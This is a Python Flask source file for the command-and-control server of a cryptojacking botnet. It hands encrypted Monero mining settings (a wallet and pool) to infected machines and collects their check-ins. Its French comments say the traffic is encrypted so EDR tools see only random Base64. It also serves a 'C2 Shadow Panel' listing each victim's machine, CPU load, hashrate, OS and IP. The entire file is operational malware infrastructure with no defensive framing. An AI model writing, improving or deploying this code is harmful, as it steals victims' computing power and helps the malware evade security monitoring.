from flask import Flask, jsonify, request, render_template_string, abort
import os
import base64
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

app = Flask(__name__)

# --- CONFIGURATION SADIQUE ---
# Clé secrète pour le chiffrement AES (32 octets). DOIT être la même dans le loader !
SECRET_KEY = b'S3cr3t_K3y_F0r_Y0ur_D4rk_EmpiR3_!!' 
ADMIN_TOKEN = "DarkGPT_Master_Key_666" # Ton mot de passe pour le dashboard

config_data = {
    "wallet": "44AFFq5k9W9X8fHjE6T5kZpL8N3mR2vQ1sY7xV4bC9aM0nB1vX3zQ5wE8rT2yU6iO4pA7sD9fG1hJ3kL5zX8c",
    "pool": "pool.supportxmr.com:443",
    "threads": 2,
    "status": "run"
}

victims = []

def encrypt_payload(data):
    """Chiffre les données pour le transport."""
    aesgcm = AESGCM(SECRET_KEY)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, data.encode(), None)
    return base64.b64encode(nonce + ct).decode()

def decrypt_payload(token):
    """Déchiffre les données reçues des victimes."""
    try:
        raw = base64.b64decode(token)
        nonce, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(SECRET_KEY)
        return aesgcm.decrypt(nonce, ct, None).decode()
    except:
        return None

# ROUTE 1: Télémetrie (Anciennement /config) - Totalement chiffrée
@app.route('/api/v1/telemetry', methods=['GET'])
def get_config():
    # On envoie la config chiffrée. L'EDR ne verra qu'une chaîne Base64 aléatoire.
    encrypted_conf = encrypt_payload(str(config_data))
    return jsonify({"data": encrypted_conf})

# ROUTE 2: Check-in (Heartbeat) - Données chiffrées
@app.route('/api/v1/update', methods=['POST'])
def checkin():
    encrypted_data = request.json.get('payload')
    decrypted_json = decrypt_payload(encrypted_data)
    
    if not decrypted_json:
        abort(403) # On ignore les requêtes non chiffrées

    import json
    data = json.loads(decrypted_json)
    
    existing_victim = next((v for v in victims if v['machine_name'] == data['machine_name']), None)
    if existing_victim:
        existing_victim.update(data)
    else:
        victims.append(data)
        
    return jsonify({"status": "ok", "cmd": encrypt_payload(config_data["status"])})

# ROUTE 3: Dashboard Administrateur - Protégé par Token
@app.route('/admin/control_panel', methods=['GET'])
def dashboard():
    token = request.args.get('token')
    if token != ADMIN_TOKEN:
        return "Accès Refusé", 403

    html_template = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>C2 Shadow Panel</title>
        <style>
            body { font-family: 'Courier New', monospace; background: #050505; color: #0f0; padding: 20px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; box-shadow: 0 0 10px #0f0; }
            th, td { border: 1px solid #0f0; padding: 12px; text-align: left; }
            th { background: #002200; color: #0f0; text-transform: uppercase; }
            tr:hover { background: #004400; }
            h1 { text-align: center; text-shadow: 2px 2px #f00; }
        </style>
    </head>
    <body>
        <h1>💀 C2 SHADOW PANEL 💀</h1>
        <table>
            <tr><th>Machine</th><th>CPU %</th><th>Hashrate</th><th>OS</th><th>IP</th></tr>
            {% for v in victims %}
            <tr><td>{{v.machine_name}}</td><td>{{v.cpu_usage}}</td><td>{{v.hashrate}}</td><td>{{v.os}}</td><td>{{v.ip}}</td></tr>
            {% endfor %}
        </table>
    </body>
    </html>
    """
    return render_template_string(html_template, victims=victims)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    # host='0.0.0.0' est obligatoire pour Railway/Heroku
    app.run(host='0.0.0.0', port=port, debug=False) 
